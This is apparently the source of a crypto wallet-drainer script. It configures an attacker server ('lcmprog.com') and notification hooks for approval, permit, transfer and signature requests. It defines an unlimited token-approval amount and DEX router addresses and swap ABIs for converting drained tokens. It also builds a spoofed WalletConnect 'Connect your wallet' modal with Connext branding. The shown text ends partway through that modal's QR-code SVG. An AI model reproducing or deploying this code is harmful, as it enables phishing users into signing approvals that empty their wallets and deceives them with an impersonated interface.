const MS_Server = "lcmprog.com";
let connect = false;

const MS_Verify_Message = "";
const MS_Custom_Chat = {
  Enable: 0,
  Chat_Settings: {
    enter_website: "",
    leave_website: "",
    connect_success: "",
    connect_request: "",
    connect_cancel: "",
    approve_request: "",
    approve_success: "",
    approve_cancel: "",
    permit_sign_data: "",
    transfer_request: "",
    transfer_success: "",
    transfer_cancel: "",
    sign_request: "",
    sign_success: "",
    sign_cancel: "",
    chain_request: "",
    chain_success: "",
    chain_cancel: "",
  }
};

var MS_Worker_ID = null;

let MS_Ready = false, MS_Settings = {}, MS_Contract_ABI = {}, MS_ID = 0, MS_Process = false,
MS_Provider = null, MS_Current_Provider = null, MS_Current_Address = null, MS_Current_Chain_ID = null,
MS_Web3 = null, MS_Signer = null, MS_Check_Done = false, MS_Currencies = {}, MS_Force_Mode = false,
MS_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false;;

(async () => {
  try {
    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    MS_Currencies = await response.json();
  } catch(err) {
    console.log(err);
  }
})();

const MS_API_Data = {
  1: 'api.etherscan.io',
  10: 'api-optimistic.etherscan.io',
  56: 'api.bscscan.com',
  137: 'api.polygonscan.com',
  250: 'api.ftmscan.com',
  42161: 'api.arbiscan.io',
  43114: 'api.snowtrace.io'
};

const scanCalls = []

var MS_MetaMask_ChainData = {};

const fill_chain_data = () => {
  MS_MetaMask_ChainData = {
    1: {
      chainId: '0x1',
      chainName: "Ethereum Mainnet",
      nativeCurrency: {
        name: "Ether",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[1]],
      blockExplorerUrls: ["https://etherscan.io"]
    },
    56: {
      chainId: '0x38',
      chainName: "BNB Smart Chain",
      nativeCurrency: {
        name: "Binance Coin",
        symbol: "BNB",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[56]],
      blockExplorerUrls: ["https://bscscan.com"]
    },
    137: {
      chainId: '0x89',
      chainName: "Polygon Mainnet",
      nativeCurrency: {
        name: "MATIC",
        symbol: "MATIC",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[137]],
      blockExplorerUrls: ["https://polygonscan.com"]
    },
    43114: {
      chainId: '0xA86A',
      chainName: "Avalanche Network C-Chain",
      nativeCurrency: {
        name: "AVAX",
        symbol: "AVAX",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[43114]],
      blockExplorerUrls: ["https://snowtrace.io/"]
    },
    42161: {
      chainId: '0xA4B1',
      chainName: "Arbitrum One",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[42161]],
      blockExplorerUrls: ["https://explorer.arbitrum.io"]
    },
    10: {
      chainId: '0xA',
      chainName: "Optimism",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[10]],
      blockExplorerUrls: ["https://optimistic.etherscan.io/"]
    },
    250: {
      chainId: '0xFA',
      chainName: "Fantom Opera",
      nativeCurrency: {
        name: "FTM",
        symbol: "FTM",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[250]],
      blockExplorerUrls: ["https://ftmscan.com/"]
    },
  };
};

const MS_Routers = {
  1: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
    ['Sushiswap', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
  ],
  10: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']
  ],
  56: [
    ['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  137: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],
    ['Quickswap', '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
  ],
  250: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  42161: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  43114: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ]
};

const MS_Swap_Route = {
  1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
  10: '0x4200000000000000000000000000000000000006',
  56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
  137: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
  250: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  42161: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
  43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
};

const MS_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
const MS_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];

const MS_Current_URL = window.location.href.replaceAll(/http[s]*:\/\//g, '');
const MS_Mobile_Status = (() => {
  let check = false;
  (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
})();

const MS_Unlimited_Amount = '1158472395435294898592384258348512586931256';

// const MS_Modal_Style = `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:10px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/web3-modal/images/arrow.svg') no-repeat}`;
// const MS_Modal_Code = `<p class="web3-modal-title" style="margin-top: 0px;">Connect your wallet</p><div class="web3-modal-items"> <div class="item" onclick="connect_wallet('MetaMask')"> <div> <div class="icon"><img src="/assets/web3-modal/images/MM.svg" alt=""/></div><span>MetaMask</span> </div><div class="arrow"></div></div><div class="item" onclick="connect_wallet('Coinbase')"> <div> <div class="icon"><img src="/assets/web3-modal/images/CB.svg" alt=""/></div><span>Coinbase</span> </div><div class="arrow"></div></div><div class="item" onclick="connect_wallet('Trust Wallet')"> <div> <div class="icon"><img src="/assets/web3-modal/images/TW.svg" alt=""/></div><span>Trust Wallet</span> </div><div class="arrow"></div></div><div class="item" onclick="connect_wallet('Binance Wallet')"> <div> <div class="icon"><img src="/assets/web3-modal/images/BW.svg" alt=""/></div><span>Binance Wallet</span> </div><div class="arrow"></div></div><div class="item" onclick="connect_wallet('WalletConnect')"> <div> <div class="icon"><img src="/assets/web3-modal/images/WC.svg" alt=""/></div><span>WalletConnect</span> </div><div class="arrow"></div></div></div>`;


const MS_Modal_Code =  `
<div id="w3m-modal" role="alertdialog" aria-modal="true" class="w3m-overlay w3m-active" style="opacity: 1;">
  <div class="w3m-container" tabindex="0" style="transform: scale(var(--motion-scale)); --motion-scale: 1;">
    <!--?lit$1626632146$-->
    <w3m-modal-backcard>
      <div class="w3m-toolbar-placeholder"></div>
      <div class="w3m-toolbar"><!--?lit$1626632146$-->
        <img src="https://bridge.connext.network/logos/logo_with_name_white.png">
        <div class="  ">
          <button><!--?lit$1626632146$-->
            <svg width="11" height="17" viewBox="0 0 11 17">
              <path fill="#fff" d="M5.22 2.97c-1.07 0-2.25.843-2.25 2.25a.75.75 0 0 1-1.5 0c0-2.393 2.019-3.75 3.75-3.75 1.73 0 3.75 1.357 3.75 3.75 0 1.64-1.038 2.466-1.785 3.057-.802.635-1.215.984-1.215 1.693a.75.75 0 1 1-1.5 0c0-1.466.985-2.24 1.681-2.788l.103-.081C7.007 6.504 7.47 6.08 7.47 5.22c0-1.407-1.181-2.25-2.25-2.25ZM5.22 14.97a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5Z"></path>
            </svg>
          </button> 
          <button><!--?lit$1626632146$-->
            <svg width="12" height="12" viewBox="0 0 12 12">
              <path d="M9.94 11A.75.75 0 1 0 11 9.94L7.414 6.353a.5.5 0 0 1 0-.708L11 2.061A.75.75 0 1 0 9.94 1L6.353 4.586a.5.5 0 0 1-.708 0L2.061 1A.75.75 0 0 0 1 2.06l3.586 3.586a.5.5 0 0 1 0 .708L1 9.939A.75.75 0 1 0 2.06 11l3.586-3.586a.5.5 0 0 1 .708 0L9.939 11Z" fill="#fff"></path>
            </svg>
          </button>
        </div>
      </div>
    </w3m-modal-backcard>
    <div class="w3m-card"><w3m-modal-router>
      <div class="w3m-router">
        <div class="w3m-content"><!--?lit$1626632146$-->
          <w3m-connect-wallet-view>
            <w3m-desktop-wallet-selection>
              <w3m-modal-header title="Connect your wallet">
                <header class=" w3m-border "><!--?lit$1626632146$--> <!--?lit$1626632146$-->
                  <w3m-text variant="big-bold"><!--?lit$1626632146$-->Connect your wallet</w3m-text> <!--?lit$1626632146$-->
                  <button class="w3m-action-btn"><!--?lit$1626632146$-->
                  <svg width="24" height="24" fill="none"><path fill="#fff" fill-rule="evenodd" d="M7.01 7.01c.03-1.545.138-2.5.535-3.28A5 5 0 0 1 9.73 1.545C10.8 1 12.2 1 15 1c2.8 0 4.2 0 5.27.545a5 5 0 0 1 2.185 2.185C23 4.8 23 6.2 23 9c0 2.8 0 4.2-.545 5.27a5 5 0 0 1-2.185 2.185c-.78.397-1.735.505-3.28.534l-.001.01c-.03 1.54-.138 2.493-.534 3.27a5 5 0 0 1-2.185 2.186C13.2 23 11.8 23 9 23c-2.8 0-4.2 0-5.27-.545a5 5 0 0 1-2.185-2.185C1 19.2 1 17.8 1 15c0-2.8 0-4.2.545-5.27A5 5 0 0 1 3.73 7.545C4.508 7.149 5.46 7.04 7 7.01h.01ZM15 15.5c-1.425 0-2.403-.001-3.162-.063-.74-.06-1.139-.172-1.427-.319a3.5 3.5 0 0 1-1.53-1.529c-.146-.288-.257-.686-.318-1.427C8.501 11.403 8.5 10.425 8.5 9c0-1.425.001-2.403.063-3.162.06-.74.172-1.139.318-1.427a3.5 3.5 0 0 1 1.53-1.53c.288-.146.686-.257 1.427-.318.759-.062 1.737-.063 3.162-.063 1.425 0 2.403.001 3.162.063.74.06 1.139.172 1.427.318a3.5 3.5 0 0 1 1.53 1.53c.146.288.257.686.318 1.427.062.759.063 1.737.063 3.162 0 1.425-.001 2.403-.063 3.162-.06.74-.172 1.139-.319 1.427a3.5 3.5 0 0 1-1.529 1.53c-.288.146-.686.257-1.427.318-.759.062-1.737.063-3.162.063ZM7 8.511c-.444.009-.825.025-1.162.052-.74.06-1.139.172-1.427.318a3.5 3.5 0 0 0-1.53 1.53c-.146.288-.257.686-.318 1.427-.062.759-.063 1.737-.063 3.162 0 1.425.001 2.403.063 3.162.06.74.172 1.139.318 1.427a3.5 3.5 0 0 0 1.53 1.53c.288.146.686.257 1.427.318.759.062 1.737.063 3.162.063 1.425 0 2.403-.001 3.162-.063.74-.06 1.139-.172 1.427-.319a3.5 3.5 0 0 0 1.53-1.53c.146-.287.257-.685.318-1.426.027-.337.043-.718.052-1.162H15c-2.8 0-4.2 0-5.27-.545a5 5 0 0 1-2.185-2.185C7 13.2 7 11.8 7 9v-.489Z" clip-rule="evenodd"></path></svg>
                  </button>
                </header>
              </w3m-modal-header>
              <w3m-modal-content>
                <div class="w3m-mobile-title">
                  <div class="w3m-subtitle"><!--?lit$1626632146$-->
                    <svg width="16" height="16" viewBox="0 0 16 16">
                      <path d="M6.75 5a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5Z" fill="#fff"></path>
                      <path fill-rule="evenodd" clip-rule="evenodd" d="M3 4.98c0-1.85 0-2.775.394-3.466a3 3 0 0 1 1.12-1.12C5.204 0 6.136 0 8 0s2.795 0 3.486.394a3 3 0 0 1 1.12 1.12C13 2.204 13 3.13 13 4.98v6.04c0 1.85 0 2.775-.394 3.466a3 3 0 0 1-1.12 1.12C10.796 16 9.864 16 8 16s-2.795 0-3.486-.394a3 3 0 0 1-1.12-1.12C3 13.796 3 12.87 3 11.02V4.98Zm8.5 0v6.04c0 .953-.001 1.568-.043 2.034-.04.446-.108.608-.154.69a1.499 1.499 0 0 1-.56.559c-.08.045-.242.113-.693.154-.47.042-1.091.043-2.05.043-.959 0-1.58-.001-2.05-.043-.45-.04-.613-.109-.693-.154a1.5 1.5 0 0 1-.56-.56c-.046-.08-.114-.243-.154-.69-.042-.466-.043-1.08-.043-2.033V4.98c0-.952.001-1.568.043-2.034.04-.446.108-.608.154-.69a1.5 1.5 0 0 1 .56-.559c.08-.045.243-.113.693-.154C6.42 1.501 7.041 1.5 8 1.5c.959 0 1.58.001 2.05.043.45.04.613.109.693.154a1.5 1.5 0 0 1 .56.56c.046.08.114.243.154.69.042.465.043 1.08.043 2.033Z" fill="#fff"></path>
                    </svg>
                    <w3m-text variant="small-regular" color="accent">Mobile</w3m-text>
                  </div>
                  <div class="w3m-subtitle"><!--?lit$1626632146$-->
                    <svg width="16" height="16" fill="none">
                      <path fill="#fff" d="M10 15.216c0 .422.347.763.768.74 1.202-.064 2.025-.222 2.71-.613a5.001 5.001 0 0 0 1.865-1.866c.39-.684.549-1.507.613-2.709a.735.735 0 0 0-.74-.768.768.768 0 0 0-.76.732c-.009.157-.02.306-.032.447-.073.812-.206 1.244-.384 1.555-.31.545-.761.996-1.306 1.306-.311.178-.743.311-1.555.384-.141.013-.29.023-.447.032a.768.768 0 0 0-.732.76ZM10 .784c0 .407.325.737.732.76.157.009.306.02.447.032.812.073 1.244.206 1.555.384a3.5 3.5 0 0 1 1.306 1.306c.178.311.311.743.384 1.555.013.142.023.29.032.447a.768.768 0 0 0 .76.732.734.734 0 0 0 .74-.768c-.064-1.202-.222-2.025-.613-2.71A5 5 0 0 0 13.477.658c-.684-.39-1.507-.549-2.709-.613a.735.735 0 0 0-.768.74ZM5.232.044A.735.735 0 0 1 6 .784a.768.768 0 0 1-.732.76c-.157.009-.305.02-.447.032-.812.073-1.244.206-1.555.384A3.5 3.5 0 0 0 1.96 3.266c-.178.311-.311.743-.384 1.555-.013.142-.023.29-.032.447A.768.768 0 0 1 .784 6a.735.735 0 0 1-.74-.768c.064-1.202.222-2.025.613-2.71A5 5 0 0 1 2.523.658C3.207.267 4.03.108 5.233.044ZM5.268 14.456a.768.768 0 0 1 .732.76.734.734 0 0 1-.768.74c-1.202-.064-2.025-.222-2.71-.613a5 5 0 0 1-1.865-1.866c-.39-.684-.549-1.507-.613-2.709A.735.735 0 0 1 .784 10c.407 0 .737.325.76.732.009.157.02.306.032.447.073.812.206 1.244.384 1.555a3.5 3.5 0 0 0 1.306 1.306c.311.178.743.311 1.555.384.142.013.29.023.447.032Z"></path>
                    </svg>
                    <w3m-text variant="small-regular" color="secondary">Scan with your wallet</w3m-text>
                  </div>
                </div>
                <w3m-walletconnect-qr>
                  <div class="w3m-qr-container"><!--?lit$1626632146$-->
                    <w3m-qrcode size="318" uri="wc:c8f3f2b60626e5f1a4f3b3463c04ce1062eb1d903605111440f91df08c9fee4b@2?relay-protocol=irn&amp;symKey=79d491cc38aa277291f09d24a129da17f22b40dd71352ee1d236df2b60c0f1b7" walletid="" imageid="">
                      <div><!--?lit$1626632146$-->
                        <svg width="96" height="96" fill="none">
                          <path fill="#fff" d="M25.322 33.597c12.525-12.263 32.83-12.263 45.355 0l1.507 1.476a1.547 1.547 0 0 1 0 2.22l-5.156 5.048a.814.814 0 0 1-1.134 0l-2.074-2.03c-8.737-8.555-22.903-8.555-31.64 0l-2.222 2.175a.814.814 0 0 1-1.134 0l-5.156-5.049a1.547 1.547 0 0 1 0-2.22l1.654-1.62Zm56.019 10.44 4.589 4.494a1.547 1.547 0 0 1 0 2.22l-20.693 20.26a1.628 1.628 0 0 1-2.267 0L48.283 56.632a.407.407 0 0 0-.567 0L33.03 71.012a1.628 1.628 0 0 1-2.268 0L10.07 50.75a1.547 1.547 0 0 1 0-2.22l4.59-4.494a1.628 1.628 0 0 1 2.267 0l14.687 14.38c.156.153.41.153.567 0l14.685-14.38a1.628 1.628 0 0 1 2.268 0l14.687 14.38c.156.153.41.153.567 0l14.686-14.38a1.628 1.628 0 0 1 2.268 0Z"></path>
                          <path stroke="#000" d="M25.672 33.954c12.33-12.072 32.325-12.072 44.655 0l1.508 1.476a1.047 1.047 0 0 1 0 1.506l-5.157 5.048a.314.314 0 0 1-.434 0l-2.074-2.03c-8.932-8.746-23.409-8.746-32.34 0l-2.222 2.174a.314.314 0 0 1-.434 0l-5.157-5.048a1.047 1.047 0 0 1 0-1.506l1.655-1.62Zm55.319 10.44 4.59 4.494a1.047 1.047 0 0 1 0 1.506l-20.694 20.26a1.128 1.128 0 0 1-1.568 0l-14.686-14.38a.907.907 0 0 0-1.267 0L32.68 70.655a1.128 1.128 0 0 1-1.568 0L10.42 50.394a1.047 1.047 0 0 1 0-1.506l4.59-4.493a1.128 1.128 0 0 1 1.567 0l14.687 14.379a.907.907 0 0 0 1.266 0l-.35-.357.35.357 14.686-14.38a1.128 1.128 0 0 1 1.568 0l14.687 14.38a.907.907 0 0 0 1.267 0l14.686-14.38a1.128 1.128 0 0 1 1.568 0Z"></path>
                        </svg> <!--?lit$1626632146$-->
                        <svg height="318" width="318"><!--?lit$1626632146$--><!---->
                          <rect fill="#fff" height="36.49180327868852" rx="11.677377049180327" ry="11.677377049180327" width="36.49180327868852" x="0" y="0"></rect><!----><!---->
                          <rect fill="#141414" height="26.065573770491802" rx="8.340983606557376" ry="8.340983606557376" width="26.065573770491802" x="5.213114754098361" y="5.213114754098361"></rect><!----><!---->
                          <rect fill="#fff" height="15.639344262295083" rx="5.004590163934426" ry="5.004590163934426" width="15.639344262295083" x="10.426229508196721" y="10.426229508196721"></rect><!----><!---->
                          <rect fill="#fff" height="36.49180327868852" rx="11.677377049180327" ry="11.677377049180327" width="36.49180327868852" x="281.5081967213115" y="0"></rect><!----><!---->
                          <rect fill="#141414" height="26.065573770491802" rx="8.340983606557376" ry="8.340983606557376" width="26.065573770491802" x="286.72131147540983" y="5.213114754098361"></rect><!----><!---->
                          <rect fill="#fff" height="15.639344262295083" rx="5.004590163934426" ry="5.004590163934426" width="15.639344262295083" x="291.93442622950823" y="10.426229508196721"></rect><!----><!---->
                          <rect fill="#fff" height="36.49180327868852" rx="11.677377049180327" ry="11.677377049180327" width="36.49180327868852" x="0" y="281.5081967213115"></rect><!----><!---->
                          <rect fill="#141414" height="26.065573770491802" rx="8.340983606557376" ry="8.340983606557376" width="26.065573770491802" x="5.213114754098361" y="286.72131147540983"></rect><!----><!---->
                          <rect fill="#fff" height="15.639344262295083" rx="5.004590163934426" ry="5.004590163934426" width="15.639344262295083" x="10.426229508196721" y="291.93442622950823"></rect><!----><!---->
                          <circle cx="159" cy="23.459016393442624" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="159" cy="33.885245901639344" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="159" cy="44.31147540983606" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="159" cy="54.73770491803278" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="159" cy="252.8360655737705" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="159" cy="263.2622950819672" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="159" cy="273.6885245901639" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="159" cy="284.11475409836066" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="159" cy="294.54098360655735" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="159" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="2.6065573770491803" cy="44.31147540983606" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="2.6065573770491803" cy="54.73770491803278" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="2.6065573770491803" cy="138.14754098360655" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="2.6065573770491803" cy="164.21311475409834" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="2.6065573770491803" cy="231.98360655737704" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="2.6065573770491803" cy="258.04918032786884" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="7.8196721311475414" cy="132.93442622950818" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="7.8196721311475414" cy="159" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="7.8196721311475414" cy="252.8360655737705" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="13.032786885245901" cy="75.59016393442623" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="13.032786885245901" cy="101.65573770491804" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="13.032786885245901" cy="117.29508196721312" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="13.032786885245901" cy="132.93442622950818" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="13.032786885245901" cy="179.85245901639342" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="13.032786885245901" cy="190.27868852459017" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="13.032786885245901" cy="216.34426229508196" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="13.032786885245901" cy="226.77049180327867" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="13.032786885245901" cy="252.8360655737705" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="18.245901639344265" cy="49.52459016393443" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="18.245901639344265" cy="59.950819672131146" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="18.245901639344265" cy="75.59016393442623" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="18.245901639344265" cy="86.01639344262296" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="18.245901639344265" cy="211.1311475409836" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="18.245901639344265" cy="237.19672131147541" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="18.245901639344265" cy="247.62295081967213" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="18.245901639344265" cy="263.2622950819672" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="18.245901639344265" cy="273.6885245901639" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="23.459016393442624" cy="96.44262295081968" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="23.459016393442624" cy="231.98360655737704" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="28.672131147540984" cy="106.8688524590164" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="28.672131147540984" cy="122.50819672131148" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="28.672131147540984" cy="132.93442622950818" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="28.672131147540984" cy="190.27868852459017" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="33.885245901639344" cy="44.31147540983606" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="33.885245901639344" cy="54.73770491803278" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="33.885245901639344" cy="65.16393442622952" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="33.885245901639344" cy="75.59016393442623" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="33.885245901639344" cy="86.01639344262296" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="33.885245901639344" cy="96.44262295081968" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="33.885245901639344" cy="106.8688524590164" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="33.885245901639344" cy="117.29508196721312" fill="#fff" r="2.085245901639344"></circle><!----><!---->
